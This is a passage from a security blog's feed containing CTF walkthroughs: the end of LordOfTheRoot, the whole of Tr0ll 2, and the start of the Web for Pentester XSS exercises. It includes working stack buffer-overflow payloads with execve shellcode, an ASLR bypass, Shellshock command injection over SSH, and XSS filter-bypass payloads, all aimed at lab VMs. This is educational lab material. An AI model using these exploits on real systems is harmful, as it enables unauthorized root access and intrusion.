libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
/lib/ld-linux.so.2 (0xb773f000)
</code></pre>

<p>smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb770c000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7545000)
/lib/ld-linux.so.2 (0xb770e000)
</code></pre>

<p>```</p>

<p>After some googling, I found a <a href="https://www.exploit-db.com/exploits/39669/">trick to disable ASLR</a>. On a vulnerable 32 bit system, ASLR doesn&rsquo;t always randomize the mmap base address when the stack size is set to unlimited. I verified that it works:</p>

<p>```
smeagol@LordOfTheRoot:/tmp$ ulimit -s unlimited
smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0x40024000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>smeagol@LordOfTheRoot:/tmp$ ldd file</p>

<pre><code>linux-gate.so.1 =&gt;  (0x40024000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
/lib/ld-linux.so.2 (0x40000000)
</code></pre>

<p>```</p>

<p>I tweaked the exploit again, but I still couldn&rsquo;t hit on a valid ESP address. In the end, I used Peda to help me locate a <em>jmp esp</em> address:</p>

<p><code>
gdb-peda$ jmpcall esp
Not found
gdb-peda$ jmpcall esp libc
0x4003ea85 : jmp esp
</code></p>

<p>Adjusted the exploit again, and it worked:</p>

<p><code>
gdb-peda$ r $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
process 5184 is executing new program: /bin/dash
$ whoami
[New process 5187]
process 5187 is executing new program: /usr/bin/whoami
smeagol
$ [Inferior 2 (process 5187) exited normally]
Warning: not running or target is remote
</code></p>

<p>To gain root, we need to exploit the real suid binary:</p>

<p>```
smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c &lsquo;print &ldquo;A&rdquo; * 171 + &ldquo;\x85\xea\x03\x40&rdquo; + &ldquo;\x90&rdquo; * 2000 + &ldquo;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&rdquo;&rsquo;)</p>

<h1>whoami</h1>

<p>root
```</p>

<h2>Privilege escalation method #3 &ndash; kernel exploit</h2>

<p>Lastly, we&rsquo;re back to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. It&rsquo;s just a matter of download, compile, run:</p>

<p><code>
smeagol@LordOfTheRoot:/tmp$ ./overlay
root@LordOfTheRoot:/tmp# whoami
root
</code></p>

<p>We owned Mordor! This was such an interesting challenge, learned many new things! Thanks to KookSec for this!</p>

<h4>Learn more</h4>

<ul>
<li><p><a href="https://www.exploit-db.com/papers/13030/">ASLR bypassing</a></p></li>
<li><p><a href="http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf">Linux Interactive Exploit Development with GDB and PEDA</a></p></li>
<li><p><a href="https://www.exploit-db.com/exploits/39669/">disable ASLR trick</a></p></li>
</ul>


<p>Will leave you with this:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/legolas.jpg" title="&lsquo;legolas&rsquo; &lsquo;legolas&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tr0ll 2 - There be trolls]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/"/>
    <updated>2017-06-06T08:58:25-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls</id>
    <content type="html"><![CDATA[<p>It&rsquo;s time to slay the second troll in the Tr0ll series!</p>

<!-- more -->


<p>First, a bit of enumeration:</p>

<p>```
Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor            <br/>
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor            <br/>
 192.168.217.129 00:0c:29:cb:3d:2e      1      60  Unknown vendor            <br/>
 192.168.217.254 00:50:56:f3:f4:fc      1      60  Unknown vendor <br/>
```</p>

<p>The IP we want is 192.168.217.129.</p>

<p>```
nmap -p- -sV -T4 192.168.217.129</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-05-30 10:27 EDT
Nmap scan report for 192.168.217.129
Host is up (0.000088s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:CB:3D:2E (VMware)
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>You know the drill! Something awaits us on that web server!</p>

<p><img class="center" src="/images/pentest/tr0ll2/troll.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>

<p>And a comment in the source:</p>

<p>``` html</p>

<p><!--Nothing here, Try Harder!>
<!--Author: Tr0ll>
<!--Editor: VIM>
```</p>

<p>I downloaded the image and ran it through exiftool, but found nothing. Next I looked if there&rsquo;s a robots.txt file, and there was..but, oh, the horror:</p>

<p><code>
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
</code></p>

<p>Ok, let&rsquo;s look (sigh). I went through them and only hit on a bunch of 404s and this image in a couple of directories:</p>

<p><img class="center" src="/images/pentest/tr0ll2/noob.png" title="&lsquo;noob&rsquo; &lsquo;noob&rsquo;" ></p>

<p>Exiftool again..and nothing again..Also tried cat_the_troll as a directory name, nothing there either. A little bit anticlimactic, but remembering the HTML comment of a Tr0ll author, what worked was logging into the FTP server with the credentials of Tr0ll/Tr0ll:</p>

<p><code>
ftp 192.168.217.129
Connected to 192.168.217.129.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.217.129:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp&gt; get lmao.zip
local: lmao.zip remote: lmao.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (8.4682 MB/s)
</code></p>

<p>After downloading the archive, I tried extracting it, but of course there&rsquo;s a password. Tried a couple of guesses, nothing worked. Lastly, I tried SSH with the same credentials, and although it worked, the session ended instantly.</p>

<p>Back to the web, I decided to download all the cat troll images, since they were in different directories, and might be different themselves:</p>

<p><code>
ls -l
total 68
-rw-r--r-- 1 root root 15873 May 30 11:48 dont_bother_cat_the_troll.jpg
-rw-r--r-- 1 root root 15831 May 30 11:48 keep_trying_cat_the_troll.jpg
-rw-r--r-- 1 root root  1474 May 30 11:38 lmao.zip
-rw-r--r-- 1 root root 15831 May 30 11:47 noob_cat_the_troll.jpg
-rw-r--r-- 1 root root 15831 May 30 11:49 ok_this_is_it_cat_the_troll.jpg
</code></p>

<p>I set the names to reflect the directories where I got them from. It seems one of them is bigger than the rest. Nothing from exiftool, this time I just tried strings and at the end of the output was this line:</p>

<p><code>
Look Deep within y0ur_self for the answer
</code></p>

<p>Finally, getting somewhere. The hint is probably a directory name on the web server, so I went there and did find an answer.txt file. Unfortunately, it was full of what looked like Base64 strings, and massive:</p>

<p><code>
wc -l answer.txt
99157 answer.txt
</code></p>

<p>I decoded it with the command: <code>base64 -d answer.txt > decoded.txt</code>, but how to figure the answer in all this sea of trolling? I remembered the troll&rsquo;s fixation on using underscores, so I tried doing a recursive grep for that:</p>

<p><code>
grep -r "_" decoded.txt
noooob_lol
</code></p>

<p>That didn&rsquo;t work as a password. Next I looked for longest line:</p>

<p><code>
wc -L decoded.txt
30 decoded.txt
</code></p>

<p>According to this command, the longest line&rsquo;s length is 30. I whipped up a quick Python script to find all lines with the length of 30:</p>

<p>``` python</p>

<h1>!/usr/bin/env python</h1>

<p>import argparse</p>

<p>desc = &ldquo;Find and print lines from a file that are a certain length&rdquo;
parser = argparse.ArgumentParser(description=desc)</p>

<h1>length argument</h1>

<p>parser.add_argument(</p>

<pre><code>'-l',
help = 'Length value',
dest = 'length',
type = int,
required=True
</code></pre>

<p>)</p>

<h1>file add_argument</h1>

<p>parser.add_argument(</p>

<pre><code>'-f',
help = 'Filename',
dest = 'filename',
type = str,
required=True
</code></pre>

<p>)</p>

<p>args = parser.parse_args()</p>

<p>with open(args.filename, &ldquo;r&rdquo;) as f:</p>

<pre><code>for line in f.readlines():
    # strip the newline character for accurate counting
    if len(line.strip('\n')) == args.length:
        print line
</code></pre>

<p>```</p>

<p>Ran it and BOOM:</p>

<p><code>
python line_length.py -l 30 -f decoded.txt
ItCantReallyBeThisEasyRightLOL
</code></p>

<p>This sounds exactly like the troll! Now I was finally able to extract the archive:</p>

<p><code>
unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password:
  inflating: noob            
</code></p>

<p>It looks like it&rsquo;s a private key:</p>

<p><code>
file noob
noob: PEM RSA private key
</code></p>

<p>I tried SSH'ing as noob this time:</p>

<p><code>
ssh -i noob noob@192.168.217.129
TRY HARDER LOL!
Connection to 192.168.217.129 closed.
</code></p>

<p>Well, that didn&rsquo;t help much. I tried appending commands, but I still got kicked out instantly without running anything. After a bit of head scratching and Google, I got reminded that SSH can be vulnerable to Shellshock, if it meets certain requirements, which are: an unpatched bash (doh), authentication using <code>authorization_keys</code>, and the user in question being restricted in the commands they could run. As it so happens, we have an old machine that may not be patched, key-based authentication, and it makes sense that a user called noob would be restricted!</p>

<p>First, a recap. The Shellshock string is <code>() { :; };</code>, and if followed by a command, that command gets executed. I tried it and:</p>

<p><code>
ssh -i noob noob@192.168.217.129 -t "() { :; }; pwd"
/home/noob
TRY HARDER LOL!
Connection to 192.168.217.129 closed.
</code></p>

<p>Excellent! The previous -t flag of the SSH command is useful when you want to run interactive applications on the remote server. Now let&rsquo;s see if we can spawn a shell:</p>

<p><code>
ssh -i noob noob@192.168.217.129 -t "() { :; }; /bin/bash"
noob@Tr0ll2:~$ uname -a
Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
</code></p>

<p>Finally, we&rsquo;re in! Before continuing though, I thought it would be helpful to better understand how Shellshock works.</p>

<h3>Shellshock explained</h3>

<p>Because Bash is a scripting language, you can do things like defining functions:</p>

<p><code>
myfunction() { echo "I am a function"; }
</code></p>

<p>And then you call it:</p>

<p><code>
noob@Tr0ll2:~$ myfunction
I am a function
</code></p>

<p>You can also export functions to environment variables, so they can be run by new bash instances:</p>

<p><code>
noob@Tr0ll2:~$ export -f myfunction
noob@Tr0ll2:~$ env
[...]
myfunction=() {  echo "I am a function"
}
</code></p>

<p>Now the function definition is inside the environment variable, and it can be evaluated:</p>

<p><code>
bash -c myfunction
I am a function
</code></p>

<p>This is intended behavior so far, but there is a vulnerability in which the evaluation continues even after the function end.</p>

<p><code>
export shocking='() { echo "This is safe" ; }; echo "This is NOT safe"'
bash -c shocking
This is NOT safe
This is safe
</code></p>

<p>Here you can see the vulnerability: the second echo statement was outside the function definition, but it was executed anyway.</p>

<p>Next, the attack fools the shell into accepting a bogus function definition. You can use <a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">this string</a> to see if your bash is vulnerable to Shellshock: <code>x=&lsquo;() { :;}; echo VULNERABLE&rsquo; bash -c :</code>.</p>

<p>Now we know that what looked like gibberish before, is actually the syntax for defining functions. With a diference of a colon instead of a function statement. The <code>:</code> is a []shell built-in(<a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b</a>) that does nothing. So, to the vulnerable shell, the function definition doesn&rsquo;t perform any action, and is then followed by an arbitrary command, that is happily executed: <code>() { :;}; CODE</code>.</p>

<p>Ok, back to the Tr0ll! To also confirm the SSH vulnerability, look in authorized_keys:</p>

<p><code>
noob@Tr0ll2:~$ cat .ssh/authorized_keys
command="echo TRY HARDER LOL!" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G/kLMyjm/rrcQymKVqy4EgUyJ+3Oyv7D5QV73IWECguqrINI+OuY+zIV49ykebBYR15HkBYi/9GYZmHRD5CHq9I+zCLHv/9Kdf9Ae+HQIaF/X/3PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9/LXVOHfcrCZyyCc+ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9+ohdZBgGVncc1ngtW0b7mKf1u+RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69 noob@Tr0ll2
</code></p>

<p>There it is, the trolling message was the command that user noob was restricted to. Ok, let&rsquo;s move on and see how we can get root. I searched for some kernel exploits, but could only find some potential exploits for 64 bit systems, and this one is 32 bit. But then:</p>

<p><code>
ls /
bin   dev  home        lib     media  nothing_to_see_here  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt    opt              root  sbin  srv      tmp  var
</code></p>

<p>Didn&rsquo;t expect to get anything out of this, but..trolls..</p>

<p>```
noob@Tr0ll2:/$ file nothing_to_see_here/
nothing_to_see_here/: setuid directory
noob@Tr0ll2:/$ ls -l nothing_to_see_here/
total 4
drwsr-xr-x 5 root root 4096 Oct  4  2014 choose_wisely
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t</p>

<p>door2:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t</p>

<p>door3:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t
```</p>

<p>I expanded the list of files in these directories so I could see everything at a glance. Let&rsquo;s see what we have:</p>

<p><code>
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ file r00t
r00t: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x4ceb2022ad50bc899c84f5e30793fe06b0a166c0, not stripped
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Usage: ./r00t input
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t lol
lol
</code></p>

<p>This appears to echo whatever you give it. I tried doing a strings on it but got permission denied error. Moved on to the next executable for now:</p>

<p>```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t
Good job, stand by, executing root shell&hellip;
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$
Broadcast message from noob@Tr0ll2</p>

<pre><code>(/dev/pts/0) at 12:57 ...
</code></pre>

<p>The system is going down for reboot NOW!
Connection to 192.168.217.129 closed by remote host.
Connection to 192.168.217.129 closed.
```</p>

<p>Ok..the troll is trying to annoy us..this binary rebooted the machine. I went on to the third and again it restarted! Not much likely for the binaries to be the same, and it was good that I had the initial picture of the binary sizes! It seems the trolling continues..by switching the binaries between directories! Keep in mind the binary sizes, and check often, because they get moved a lot.</p>

<p>``` plain
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t</p>

<p>2 MINUTE HARD MODE LOL
```</p>

<p>Wasn&rsquo;t sure what this one did, until I got a permission denied when running ls :&ndash;) so in those 2 minutes, we are probably stripped by even the basic permissions. By now, it seemed that the only interesting binary would be the one that takes user input (largest one), so I got back to it. I used <code>pattern_create.rb</code> to build a 500 bytes long string and feed it to the binary, and it segfaulted! So, we have a buffer overflow here!</p>

<p><code>plain
Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
</code></p>

<p>Let&rsquo;s see where exactly in the pattern it happens:</p>

<p><code>plain
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969 -l 500
[*] Exact match at offset 268
</code></p>

<p>Taking a closer look at the registers and stack:</p>

<p>``` plain
(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;B&rsquo; * 4 + &lsquo;C&rsquo; * 16&rdquo;)</p>

<p>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;B&rsquo; * 4 + &lsquo;C&rsquo; * 16&rdquo;)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info r
eax            0x120    288
ecx            0x0  0
edx            0x0  0
ebx            0xb7fd1ff4   -1208147980
esp            0xbffffb50   0xbffffb50
ebp            0x41414141   0x41414141
esi            0x0  0
edi            0x0  0
eip            0x42424242   0x42424242
eflags         0x210286 [ PF SF IF RF ID ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x33 51
(gdb) x $esp
0xbffffb50: 0x43434343
```</p>

<p>ESP has been overwritten with part of our string, so we can craft some shellcode and jump to the address of ESP to execute it. I picked the <a href="https://www.exploit-db.com/exploits/40131/">Linux x86 execve /bin/sh</a> shellcode, which is 19 bytes long.</p>

<p>What we have now for a functional exploit:</p>

<ul>
<li><p>268 bytes to fill the buffer</p></li>
<li><p>overwrite EIP with the address of ESP, which is <code>0xbffffb50</code>, and in little endian it is <code>\x50\xfb\xff\xbf</code></p></li>
<li><p>NOP sled for padding</p></li>
<li><p>shellcode: <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80</code></p></li>
</ul>


<p>Ran the exploit in GDB:</p>

<p><code>
(gdb) r $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
process 1838 is executing new program: /bin/dash
$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
</code></p>

<p>Remember that a shell which you get in GDB has the privileges that GDB runs at, so this is not a real root shell. We have to run it outside GDB. I did so and I got a big..segmentation fault! What worked in GDB didn&rsquo;t work outside it, and as I was getting frustrated, I looked at other writeups, to see if anyone else had the same problem. It seems it should have run smoothly, but there can be a discrepancy in memory between a live environment and a GDB one. I tweaked the ESP address a few times, before hitting the right one:</p>

<p>```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 268 + &ldquo;\x90\xfb\xff\xbf&rdquo; + &ldquo;x90&rdquo; * 16 + &ldquo;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80&rdquo;&rsquo;)</p>

<h1>id</h1>

<p>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)</p>

<h1>ls /root/</h1>

<p>Proof.txt  core1  core2  core3  core4  goal  hardmode  lmao.zip  ran_dir.py  reboot</p>

<h1>cat /root/Proof.txt</h1>

<p>You win this time young Jedi&hellip;</p>

<p>a70354f0258dcc00292c72aab3c8b1e4<br/>
```</p>

<p>The valid ESP address was <code>0xbffffb90</code>. If you try it in GDB though, you will get a segfault there. Ah, this challenge trolled me on so many levels!</p>

<p>```
/ A visit to a fresh place will bring \
\ strange work.                       /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Web for Pentester]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester/"/>
    <updated>2017-05-04T06:38:11-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester</id>
    <content type="html"><![CDATA[<p>Today I want to mix things up a bit, and do a challenge focused exclusively on web vulnerabilities. For the target, I will use the Web for Pentester ISO offered by <a href="https://www.pentesterlab.com/">PentesterLab</a>. They host many challenges dedicated to web hacking, and I recommend you give them a try!</p>

<!-- more -->


<p>Navigating to the VM, we are greeted by this page:</p>

<p><img class="center" src="/images/pentest/webpentester/web.png" title="&lsquo;web for pentester&rsquo; &lsquo;web for pentester&rsquo;" ></p>

<p>As you can see, we&rsquo;ve got plenty of exercises, so let&rsquo;s begin!</p>

<h3>XSS</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss1.png" title="&lsquo;xss&rsquo; &lsquo;web for pentester xss 1&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
<html>
Hello
&lt;?php</p>

<pre><code>echo $_GET["name"];
</code></pre>

<p>?></p>

<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This is the most basic type of injection:</p>

<p>``` html</p>

<script>alert('there')</script>


<p>```</p>

<p>Now you will get an alert box and if you look in the source, you will see the exact same injection, with no filtering whatsoever.</p>

<p><strong>Example 2</strong></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello
&lt;?php</p>

<p>$name =  $_GET[&ldquo;name&rdquo;];
$name = preg_replace(&ldquo;/<script>/&rdquo;,&ldquo;&rdquo;, $name);
$name = preg_replace(&ldquo;/&lt;\/script>/&rdquo;,&ldquo;&rdquo;, $name);
echo $name;
?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This one looks like the previous one, but in the source, we can see that the script tags are replaced with empty strings, but only for lowercase. I changed the case of the script tags to SCRIPT, and the alert box was back!</p>

<p><strong>Example 3</strong></p>

<p>The source looks like this:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello
&lt;?php</p>

<pre><code>$name =  $_GET["name"];
$name = preg_replace("/&lt;script&gt;/i","", $name);
$name = preg_replace("/&lt;\/script&gt;/i","", $name);
</code></pre>

<p>echo $name;
?></p>

<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This time the script tags are filtered regardless of the case. To see what&rsquo;s going on, I inserted script tags inside a placeholder value:</p>

<p><code>plain
place&lt;script&gt;holder
</code></p>

<p>As expected, they disappear into the abyss, and the message echoed in the page is Hello placeholder . I then tried doubling the script tags:</p>

<p><code>plain
place&lt;&lt;script&gt;&gt;holder
</code></p>

<p>The message changed to <code>Hello place&lt;>holder</code> . This is great, it means we can have nested tags that will be interpreted! I built the payload to:</p>

<p><code>plain
 &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
</code></p>

<p><strong>Example 4</strong></p>

<p>Source:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;;</p>

<p>if (preg_match(&lsquo;/script/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
  die(&ldquo;error&rdquo;);
}
?></p>

<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This time, the script throws an error if it sees anything resembling script tags. Luckily, we can get an XSS payload to execute in different ways. For this I used:</p>

<p><code>plain
&lt;img src='nope' onerror="alert('Got ya')" /&gt;
</code></p>

<p><strong>Example 5</strong></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;;</p>

<p>if (preg_match(&lsquo;/alert/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
  die(&ldquo;error&rdquo;);
}
?></p>

<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>All right, it looks like script tags aren&rsquo;t blacklisted anymore, but this time the alert word is. I just substituted the alert for prompt:</p>

<p>``` plain</p>

<script>prompt('Enter pwn code')</script>


<p>```</p>

<p><strong>Example 6</strong></p>

<p>PHP source:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= "<?php  echo $_GET["name"]; ?>";
</script>


<pre><code>&lt;?php require_once '../footer.php'; ?&gt;
</code></pre>

<p>```</p>

<p>This time, whatever we place inside the name variable is assigned to a variable. The page source looks like this:</p>

<p>``` html
Hello</p>

<script>
    var $a= "hacker";
</script>


<p>```</p>

<p>We want to build on the existing code and add our own. This means we will have to close the quotes and add our payload. First, I inserted something to see the changes:</p>

<p><code>plain
hacker";INJECTION
</code></p>

<p>And in the HTML code I saw this:</p>

<p><code>plain
var $a= "hacker";INJECTION";
</code></p>

<p>The part up to the first semicolon is what we want, then we have to place our payload, but a stray doublequote and semicolon remain. To get rid of them, I commented them out, and the final injection looked like this:</p>

<p><code>plain
hacker";alert("not enough");//
</code></p>

<p>And in the source it is rendered the following way:</p>

<p><code>plain
var $a= "hacker";alert("not enough");//";
</code></p>

<p><strong>Example 7</strong></p>

<p>PHP code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= '<?php  echo htmlentities($_GET["name"]); ?>';
</script>


<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>It appears that now there is encoding performed on the name variable to prevent the previous type of bypass. Let&rsquo;s see how the source looks with the previous payload:</p>

<p><code>plain
var $a= 'hacker&amp;quot;;alert(&amp;quot;not enough&amp;quot;);//';
</code></p>

<p>The attack was nullified, but if you look at the <code>htmlentities</code> PHP manual page, you will see that, if not otherwise specified, the default flag is ENT_COMPAT, which converts double-quotes and leaves single-quotes alone. So all I had to do was replace the double-quotes with single-quotes:</p>

<p><code>plain
hacker';alert('still not enough');//
</code></p>

<p>And this is translated in the HTML as:</p>

<p><code>plain
var $a= 'hacker';alert('stillnot enough');//';
</code></p>

<p><strong>Example8</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss8.png" title="&lsquo;xss 8&rsquo; &lsquo;web for pentester xss 8&rsquo;" ></p>

<p>This looks a little different, we input something and it gets echoed back in a greeting: HELLO something</p>

<p>Source code:</p>

<p>``` php
&lt;?php
  require_once &lsquo;../header.php&rsquo;;</p>

<p>  if (isset($_POST[&ldquo;name&rdquo;])) {</p>

<pre><code>echo "HELLO ".htmlentities($_POST["name"]);
</code></pre>

<p>  }
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>&ldquo; method="POST&rdquo;>
  Your name:<input type="text" name="name" />
  <input type="submit" name="submit"/></p>

<p>&lt;?php</p>

<p>  require_once &lsquo;../footer.php&rsquo;;</p>

<p>?>
```</p>

<p>PHP_SELF returns the currently executing script and its path from the root folder. In our case, where the URL is <a href="http://192.168.217.138/xss/example8.php">http://192.168.217.138/xss/example8.php</a> , PHP_SELF would be /xss/example8.php .</p>

<p><a href="http://form.guide/php-form/php-form-action-self.html">The PHP_SELF variable</a> is vulnerable to XSS if not enclosed within htmlentities(). Which means we can put our payload in the URL: <a href="http://192.168.217.138/xss/example8.php/INJECTION">http://192.168.217.138/xss/example8.php/INJECTION</a></p>

<p>Now, we need to take note of how to build the payload:</p>

<p><code>html
HELLO hacker&lt;form action="/xss/example8.php/hacker" method="POST"&gt;
</code></p>

<p>My successful injection was:</p>

<p><code>plain
hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"
</code></p>

<p>And the source now looks like this:</p>

<p><code>html
&lt;form action="/xss/example8.php/hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"" method="POST"&gt;
</code></p>

<p>The first double-quote and <code>></code> closed the form action part, then came the injection, and then I put another double-quote to keep company to the stray one that remained.</p>

<p><strong>Example9</strong></p>

